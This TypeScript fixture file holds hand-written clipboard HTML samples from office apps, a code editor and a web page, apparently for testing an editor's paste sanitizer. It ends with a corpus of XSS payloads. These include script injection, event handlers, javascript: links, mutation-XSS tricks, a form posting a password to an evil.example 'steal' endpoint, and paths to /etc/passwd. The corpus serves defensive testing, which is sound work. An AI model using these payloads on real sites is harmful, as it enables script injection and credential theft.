/**
 * Clipboard HTML fixtures.
 *
 * These reproduce the `text/html` flavour that the named applications put on
 * the clipboard (structure, wrapper elements, inline styles, conditional
 * comments, list encodings). They were written by hand from the applications'
 * known output formats; they were NOT captured from live applications in this
 * environment, which has neither a desktop nor those products.
 */

const GDOCS_SPAN =
  'font-size:11pt;font-family:Arial,sans-serif;color:#000000;background-color:transparent;font-weight:400;font-style:normal;font-variant:normal;text-decoration:none;vertical-align:baseline;white-space:pre;white-space:pre-wrap;';
const gspan = (text: string, extra = ''): string =>
  `<span style="${GDOCS_SPAN}${extra}">${text}</span>`;
const GDOCS_P = 'line-height:1.38;margin-top:0pt;margin-bottom:0pt;';
const GDOCS_LI =
  'list-style-type:disc;font-size:11pt;font-family:Arial,sans-serif;color:#000000;background-color:transparent;font-weight:400;font-style:normal;font-variant:normal;text-decoration:none;vertical-align:baseline;white-space:pre;';
const GDOCS_TD =
  'border-left:solid #000000 1pt;border-right:solid #000000 1pt;border-bottom:solid #000000 1pt;border-top:solid #000000 1pt;vertical-align:top;padding:5pt 5pt 5pt 5pt;overflow:hidden;overflow-wrap:break-word;';

export const GOOGLE_DOCS_HTML =
  `<meta charset='utf-8'><meta charset="utf-8"><b style="font-weight:normal;" id="docs-internal-guid-6f1d2c3a-7fff-1b2c-3d4e-5f6a7b8c9d0e">` +
  `<h1 dir="ltr" style="line-height:1.38;margin-top:20pt;margin-bottom:6pt;"><span style="font-size:20pt;font-family:Arial,sans-serif;color:#000000;background-color:transparent;font-weight:400;font-style:normal;font-variant:normal;text-decoration:none;vertical-align:baseline;white-space:pre;white-space:pre-wrap;">Quarterly plan</span></h1>` +
  `<p dir="ltr" style="${GDOCS_P}">` +
  gspan('Plain text, ') +
  gspan('bold', 'font-weight:700;') +
  gspan(', ') +
  gspan('italic', 'font-style:italic;') +
  gspan(', ') +
  gspan(
    'underlined',
    'text-decoration:underline;-webkit-text-decoration-skip:none;text-decoration-skip-ink:none;',
  ) +
  gspan(', ') +
  gspan('struck', 'text-decoration:line-through;') +
  gspan(', ') +
  gspan('red', 'color:#ff0000;') +
  gspan(', ') +
  gspan('highlighted', 'background-color:#ffff00;') +
  gspan(' and a ') +
  `<a href="https://example.com/plan" style="text-decoration:none;"><span style="font-size:11pt;font-family:Arial,sans-serif;color:#1155cc;background-color:transparent;font-weight:400;font-style:normal;font-variant:normal;text-decoration:underline;-webkit-text-decoration-skip:none;text-decoration-skip-ink:none;vertical-align:baseline;white-space:pre;white-space:pre-wrap;">link</span></a>` +
  gspan('.') +
  `</p><br />` +
  `<p dir="ltr" style="${GDOCS_P}text-align: center;">${gspan('Centered line')}</p>` +
  `<p dir="ltr" style="line-height:2.4;margin-left: 36pt;margin-top:0pt;margin-bottom:0pt;">${gspan('Indented and double spaced')}</p>` +
  `<ul style="margin-top:0;margin-bottom:0;padding-inline-start:48px;">` +
  `<li dir="ltr" style="${GDOCS_LI}" aria-level="1"><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('First bullet')}</p></li>` +
  `<ul style="margin-top:0;margin-bottom:0;padding-inline-start:48px;"><li dir="ltr" style="${GDOCS_LI}" aria-level="2"><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Nested bullet')}</p></li></ul>` +
  `<li dir="ltr" style="${GDOCS_LI}" aria-level="1"><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Second bullet')}</p></li></ul>` +
  `<ol style="margin-top:0;margin-bottom:0;padding-inline-start:48px;"><li dir="ltr" style="${GDOCS_LI}" aria-level="1"><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Step one')}</p></li><li dir="ltr" style="${GDOCS_LI}" aria-level="1"><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Step two')}</p></li></ol>` +
  `<ul style="margin-top:0;margin-bottom:0;padding-inline-start:28px;">` +
  `<li dir="ltr" role="checkbox" aria-checked="true" style="list-style-type:none;" aria-level="1"><img src="https://lh3.googleusercontent.com/checked.png" width="17.25" height="17.25" alt="checked" aria-roledescription="checkbox" role="checkbox" aria-checked="true" /><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Done item')}</p></li>` +
  `<li dir="ltr" role="checkbox" aria-checked="false" style="list-style-type:none;" aria-level="1"><img src="https://lh3.googleusercontent.com/unchecked.png" width="17.25" height="17.25" alt="unchecked" aria-roledescription="checkbox" role="checkbox" aria-checked="false" /><p dir="ltr" style="${GDOCS_P}" role="presentation">${gspan('Open item')}</p></li></ul>` +
  `<div dir="ltr" style="margin-left:0pt;" align="left"><table style="border:none;border-collapse:collapse;"><colgroup><col width="120" /><col width="120" /></colgroup><tbody>` +
  `<tr style="height:0pt"><td style="${GDOCS_TD}"><p dir="ltr" style="line-height:1.2;margin-top:0pt;margin-bottom:0pt;">${gspan('Phase', 'font-weight:700;')}</p></td><td style="${GDOCS_TD}"><p dir="ltr" style="line-height:1.2;margin-top:0pt;margin-bottom:0pt;">${gspan('Owner', 'font-weight:700;')}</p></td></tr>` +
  `<tr style="height:0pt"><td style="${GDOCS_TD}"><p dir="ltr" style="line-height:1.2;margin-top:0pt;margin-bottom:0pt;">${gspan('Pilot')}</p></td><td style="${GDOCS_TD}"><p dir="ltr" style="line-height:1.2;margin-top:0pt;margin-bottom:0pt;">${gspan('Asha')}</p></td></tr>` +
  `</tbody></table></div>` +
  `<p dir="ltr" style="${GDOCS_P}"><span style="${GDOCS_SPAN}"><span style="border:none;display:inline-block;overflow:hidden;width:300px;height:200px;"><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXabc?key=xyz" width="300" height="200" style="margin-left:0px;margin-top:0px;" alt="Roadmap chart" /></span></span></p>` +
  `<p dir="ltr" style="${GDOCS_P}">${gspan('Run ')}<span style="font-size:11pt;font-family:'Courier New',monospace;color:#000000;background-color:transparent;font-weight:400;white-space:pre-wrap;">pnpm install</span>${gspan(' first.')}</p>` +
  `<p dir="ltr" style="${GDOCS_P}">${gspan('नमस्ते दुनिया, mixed with English 🚀✨')}</p>` +
  `</b><br class="Apple-interchange-newline">`;

const WORD_MARKER = (glyph: string, font: string): string =>
  `<![if !supportLists]><span style='font-family:${font};mso-fareast-font-family:${font};mso-bidi-font-family:${font}'><span style='mso-list:Ignore'>${glyph}<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><![endif]>`;

export const WORD_HTML =
  `<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40">` +
  `<head><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta name=ProgId content=Word.Document><meta name=Generator content="Microsoft Word 15"><meta name=Originator content="Microsoft Word 15">` +
  `<link rel=File-List href="file:///C:/Users/x/AppData/Local/Temp/msohtmlclip1/01/clip_filelist.xml">` +
  `<!--[if gte mso 9]><xml><w:WordDocument><w:View>Normal</w:View><w:Zoom>0</w:Zoom></w:WordDocument></xml><![endif]-->` +
  `<style><!-- /* Font Definitions */ @font-face {font-family:Calibri; panose-1:2 15 5 2 2 2 4 3 2 4;} p.MsoNormal, li.MsoNormal, div.MsoNormal {margin:0in; font-size:11.0pt; font-family:"Calibri",sans-serif;} --></style></head>` +
  `<body lang=EN-US style='tab-interval:.5in;word-wrap:break-word'><!--StartFragment-->` +
  `<h1>Project <span style='color:red'>brief</span><o:p></o:p></h1>` +
  `<p class=MsoNormal>Normal text with <b>bold</b>, <i>italic</i>, <u>underline</u>, <s>strike</s> and <span style='background:yellow;mso-highlight:yellow'>highlight</span>.<o:p></o:p></p>` +
  `<p class=MsoNormal><o:p>&nbsp;</o:p></p>` +
  `<p class=MsoListParagraphCxSpFirst style='text-indent:-.25in;mso-list:l0 level1 lfo1'>${WORD_MARKER('·', 'Symbol')}First bullet<o:p></o:p></p>` +
  `<p class=MsoListParagraphCxSpMiddle style='margin-left:1.0in;mso-add-space:auto;text-indent:-.25in;mso-list:l0 level2 lfo1'>${WORD_MARKER('o', '"Courier New"')}Nested bullet<o:p></o:p></p>` +
  `<p class=MsoListParagraphCxSpLast style='text-indent:-.25in;mso-list:l0 level1 lfo1'>${WORD_MARKER('·', 'Symbol')}Second <b>bullet</b><o:p></o:p></p>` +
  `<p class=MsoListParagraphCxSpFirst style='text-indent:-.25in;mso-list:l1 level1 lfo2'>${WORD_MARKER('1.', 'Calibri')}Step one<o:p></o:p></p>` +
  `<p class=MsoListParagraphCxSpLast style='text-indent:-.25in;mso-list:l1 level1 lfo2'>${WORD_MARKER('2.', 'Calibri')}Step two<o:p></o:p></p>` +
  `<table class=MsoTableGrid border=1 cellspacing=0 cellpadding=0 style='border-collapse:collapse;border:none;mso-border-alt:solid windowtext .5pt'>` +
  `<tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes'><td width=312 valign=top style='width:233.75pt;border:solid windowtext 1.0pt;padding:0in 5.4pt 0in 5.4pt'><p class=MsoNormal><b>Name<o:p></o:p></b></p></td><td width=312 valign=top style='width:233.75pt;border:solid windowtext 1.0pt;border-left:none;padding:0in 5.4pt 0in 5.4pt'><p class=MsoNormal><b>Role<o:p></o:p></b></p></td></tr>` +
  `<tr style='mso-yfti-irow:1;mso-yfti-lastrow:yes'><td width=312 valign=top style='width:233.75pt;border:solid windowtext 1.0pt;border-top:none;padding:0in 5.4pt 0in 5.4pt'><p class=MsoNormal>Asha<o:p></o:p></p></td><td width=312 valign=top style='width:233.75pt;border-top:none;border-left:none;padding:0in 5.4pt 0in 5.4pt'><p class=MsoNormal>Editor<o:p></o:p></p></td></tr></table>` +
  `<p class=MsoNormal><span style='mso-no-proof:yes'><!--[if gte vml 1]><v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"></v:shapetype><v:shape id="Picture_x0020_1" o:spid="_x0000_i1025" type="#_x0000_t75" style='width:100pt;height:50pt;visibility:visible'><v:imagedata src="file:///C:/Users/x/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" o:title=""/></v:shape><![endif]--><![if !vml]><img width=133 height=67 src="file:///C:/Users/x/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" v:shapes="Picture_x0020_1"><![endif]></span><o:p></o:p></p>` +
  `<p class=MsoNormal>Text with a comment<a style='mso-comment-reference:AB_1;mso-comment-date:20260101T1200'>ed word</a><span class=MsoCommentReference><span style='font-size:8.0pt'><a class=msocomanchor id="_anchor_1" href="#_msocom_1" language=JavaScript name="_msoanchor_1">[AB1]</a></span></span> and <del cite="mailto:reviewer" datetime="2026-01-01T12:00">removed </del><ins cite="mailto:reviewer" datetime="2026-01-01T12:00">inserted</ins> text.<o:p></o:p></p>` +
  `<p class=MsoNormal align=center style='text-align:center;line-height:200%'>Centered double<o:p></o:p></p>` +
  `<span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><br clear=all style='mso-special-character:line-break;page-break-before:always'></span>` +
  `<p class=MsoNormal>हिंदी और English with emoji 😀<o:p></o:p></p>` +
  `<!--EndFragment-->` +
  `<div style='mso-element:comment-list'><hr class=msocomoff align=left size=1 width="33%"><div style='mso-element:comment'><div id="_com_1" class=msocomtxt language=JavaScript><span class=MsoCommentReference><a name="_msocom_1"></a></span><p class=MsoCommentText>This is a reviewer comment</p></div></div></div>` +
  `</body></html>`;

const SHEETS_TD = 'overflow:hidden;padding:2px 3px 2px 3px;vertical-align:bottom;';

export const GOOGLE_SHEETS_HTML =
  `<meta charset='utf-8'><google-sheets-html-origin><style type="text/css"><!--td {border: 1px solid #cccccc;}br {mso-data-placement:same-cell;}--></style>` +
  `<table xmlns="http://www.w3.org/1999/xhtml" cellspacing="0" cellpadding="0" dir="ltr" border="1" style="table-layout:fixed;font-size:10pt;font-family:Arial;width:0px;border-collapse:collapse;border:none" data-sheets-root="1" data-sheets-baot="1">` +
  `<colgroup><col width="100"/><col width="100"/><col width="100"/></colgroup><tbody>` +
  `<tr style="height:21px;"><td style="${SHEETS_TD}background-color:#d9ead3;font-weight:bold;" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Item&quot;}">Item</td><td style="${SHEETS_TD}background-color:#d9ead3;font-weight:bold;" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Qty&quot;}">Qty</td><td style="${SHEETS_TD}background-color:#d9ead3;font-weight:bold;" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Total&quot;}">Total</td></tr>` +
  `<tr style="height:21px;"><td style="${SHEETS_TD}" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Pens&quot;}">Pens</td><td style="${SHEETS_TD}text-align:right;" data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:12}">12</td><td style="${SHEETS_TD}text-align:right;" data-sheets-value="{&quot;1&quot;:3,&quot;3&quot;:36}" data-sheets-formula="=R[0]C[-1]*3">36</td></tr>` +
  `<tr style="height:21px;"><td style="${SHEETS_TD}" colspan="2" rowspan="1" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;Line one\\nLine two&quot;}">Line one<br/>Line two</td><td style="${SHEETS_TD}font-style:italic;color:#ff0000;" data-sheets-value="{&quot;1&quot;:2,&quot;2&quot;:&quot;late&quot;}">late</td></tr>` +
  `</tbody></table></google-sheets-html-origin>`;

export const EXCEL_HTML =
  `<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40">` +
  `<head><meta http-equiv=Content-Type content="text/html; charset=utf-8"><meta name=ProgId content=Excel.Sheet><meta name=Generator content="Microsoft Excel 15">` +
  `<link id=Main-File rel=Main-File href="file:///C:/Users/x/AppData/Local/Temp/msohtmlclip1/01/clip.htm">` +
  `<style><!--table {mso-displayed-decimal-separator:"\\.";mso-displayed-thousand-separator:"\\,";} .xl65 {font-weight:700;background:#DDEBF7;mso-pattern:black none;} --></style></head>` +
  `<body link="#0563C1" vlink="#954F72"><table border=0 cellpadding=0 cellspacing=0 width=192 style='border-collapse:collapse;width:144pt'><!--StartFragment-->` +
  `<col width=64 span=3 style='width:48pt'>` +
  `<tr height=20 style='height:15.0pt'><td height=20 class=xl65 width=64 style='height:15.0pt;width:48pt;font-weight:700;background:#DDEBF7'>Region</td><td class=xl65 width=64 style='width:48pt;font-weight:700;background:#DDEBF7'>Sales</td></tr>` +
  `<tr height=20 style='height:15.0pt'><td height=20 style='height:15.0pt'>North</td><td align=right x:num>800</td></tr>` +
  `<tr height=20 style='height:15.0pt;display:none'><td height=20 style='height:15.0pt'>Hidden</td><td align=right x:num>1</td></tr>` +
  `<tr height=20 style='height:15.0pt'><td height=20 style='height:15.0pt'>Total</td><td align=right x:num x:fmla="=SUM(B2:B3)">1200</td></tr>` +
  `<!--EndFragment--></table></body></html>`;

/** What VS Code puts on the clipboard for a few lines of TypeScript. */
export const CODE_EDITOR_HTML =
  `<meta charset='utf-8'><div style="color: #d4d4d4;background-color: #1e1e1e;font-family: Consolas, 'Courier New', monospace;font-weight: normal;font-size: 14px;line-height: 19px;white-space: pre;">` +
  `<div><span style="color: #569cd6;">const</span><span style="color: #d4d4d4;"> </span><span style="color: #4fc1ff;">answer</span><span style="color: #d4d4d4;"> = </span><span style="color: #b5cea8;">42</span><span style="color: #d4d4d4;">;</span></div>` +
  `<div><span style="color: #c586c0;">if</span><span style="color: #d4d4d4;"> (</span><span style="color: #4fc1ff;">answer</span><span style="color: #d4d4d4;">) {</span></div>` +
  `<div><span style="color: #d4d4d4;">  </span><span style="color: #9cdcfe;">console</span><span style="color: #d4d4d4;">.</span><span style="color: #dcdcaa;">log</span><span style="color: #d4d4d4;">(</span><span style="color: #ce9178;">'&lt;b&gt;ok&lt;/b&gt;'</span><span style="color: #d4d4d4;">);</span></div>` +
  `<div><span style="color: #d4d4d4;">}</span></div></div>`;

/** A typical article fragment copied from a browser. */
export const WEB_PAGE_HTML =
  `<meta charset='utf-8'><article class="post"><header><h2 class="title" style="font-family: Georgia, serif; color: rgb(17, 17, 17);">Release notes</h2></header>` +
  `<div class="lead">Version 2 is <strong>out</strong> &mdash; see the <a href="/changelog" title="relative">changelog</a> or <a href="https://example.org/docs?a=1&amp;b=2">the docs</a>.</div>` +
  `<div>Second line in its own block</div>` +
  `<blockquote><p>Quoted <em>text</em></p></blockquote>` +
  `<pre><code class="language-js hljs">const a = 1;\nconsole.log(a);</code></pre>` +
  `<ul><li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled checked> shipped</li><li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled> pending</li></ul>` +
  `<figure><img src="https://cdn.example.org/img/hero%20shot.png"><figcaption>Hero shot</figcaption></figure>` +
  `<hr><p style="text-align:right">Signed <sub>x</sub><sup>2</sup> <mark>marked</mark> <kbd>Ctrl</kbd></p>` +
  `<h6>Tiny heading</h6><table><thead><tr><th>A</th><th>B</th></tr></thead><tbody><tr><td>1</td><td>2</td></tr></tbody></table></article>`;

/** Active content that must never reach the document. */
export const MALICIOUS_CORPUS: { name: string; html: string }[] = [
  {
    name: 'script tag',
    html: '<p>before<script>window.__pwned = 1; alert("xss-marker")</script>after</p>',
  },
  { name: 'script with src', html: '<script src="https://evil.example/x.js"></script><p>text</p>' },
  { name: 'img onerror', html: '<img src="x" onerror="alert(`xss-marker`)"><p>text</p>' },
  {
    name: 'event handlers on blocks',
    html: '<p onclick="alert(1)" onmouseover="alert(2)">click <b onfocus="alert(3)" tabindex="0">me</b></p>',
  },
  { name: 'javascript link', html: '<a href="javascript:alert(\'xss-marker\')">click</a>' },
  {
    name: 'javascript link with whitespace and case',
    html: '<a href=" JaVa\tScRiPt:alert(1)">click</a><a href="&#106;avascript:alert(1)">entity</a>',
  },
  {
    name: 'vbscript and data html links',
    html: '<a href="vbscript:msgbox(1)">a</a><a href="data:text/html,<script>alert(1)</script>">b</a><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">c</a>',
  },
  {
    name: 'svg with script',
    html: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert("xss-marker")</script><circle r="5"/><a href="javascript:alert(1)"><text>x</text></a></svg><p>ok</p>',
  },
  {
    name: 'svg foreignObject',
    html: '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe><body onload="alert(1)"></body></foreignObject></svg>',
  },
  {
    name: 'data html image',
    html: '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="><p>t</p>',
  },
  {
    name: 'style expression',
    html: '<p style="width: expression(alert(1)); background: url(javascript:alert(1)); behavior: url(evil.htc); -moz-binding: url(evil.xml#x)">styled</p>',
  },
  {
    name: 'style element',
    html: '<style>@import url("https://evil.example/x.css"); p { background: url(javascript:alert(1)) }</style><p>text</p>',
  },
  {
    name: 'nested iframes',
    html: '<iframe src="https://evil.example"><iframe src="javascript:alert(1)"></iframe></iframe><p>text</p><iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
  },
  {
    name: 'object and embed',
    html: '<object data="https://evil.example/x.swf"><param name="movie" value="x"><embed src="https://evil.example/x.swf"></object><p>text</p>',
  },
  {
    name: 'form with action',
    html: '<form action="https://evil.example/steal" method="post"><input name="password" type="password"><button formaction="javascript:alert(1)">go</button><textarea>t</textarea><select><option>a</option></select></form><p>after</p>',
  },
  {
    name: 'meta refresh and base',
    html: '<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css"><p>text</p>',
  },
  {
    name: 'mutation xss via noscript/math',
    html: '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;"></mglyph></table></mtext></math><noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  },
  {
    name: 'template and xmp',
    html: '<template><script>alert(1)</script></template><xmp><script>alert(1)</script></xmp><plaintext><script>alert(1)</script>',
  },
  {
    name: 'srcset and background',
    html: '<img srcset="https://evil.example/a.png 1x" src="https://evil.example/t.gif" lowsrc="javascript:alert(1)"><table background="javascript:alert(1)"><tr><td background="https://evil.example/t.gif">cell</td></tr></table>',
  },
  {
    name: 'crafted editor nodes',
    html: '<figure data-type="image" data-asset-id="javascript:alert(1)" data-upload-id="3f2b8c1e-9a4d-4c7b-8e21-5d6f7a8b9c0d" data-alt="\\"><img src=x onerror=alert(1)>"><img src="x" onerror="alert(1)"></figure><div data-type="attachment" data-asset-id="../../etc/passwd" data-name="<script>alert(1)</script>" onclick="alert(1)">x</div><pre data-type="diagram" data-language="javascript" onmouseover="alert(1)"><code>graph TD; A["<img src=x onerror=alert(1)>"]-->B; click A "javascript:alert(1)"</code></pre>',
  },
  {
    name: 'link with target and rel tricks',
    html: '<a href="https://example.com" target="_top" rel="opener" onclick="alert(1)" ping="https://evil.example/ping">ok link</a><a href="//evil.example/protocol-relative">rel</a><a href="file:///etc/passwd">file</a><a href="realtimedocs://open?server=https://evil.example&doc=x&code=y">deep link</a>',
  },
  {
    name: 'animation and marquee',
    html: '<marquee onstart="alert(1)">m</marquee><details open ontoggle="alert(1)"><summary>s</summary>d</details><video autoplay onloadstart="alert(1)"><source src="https://evil.example/v.mp4"></video><audio src="x" onerror="alert(1)"></audio>',
  },
];
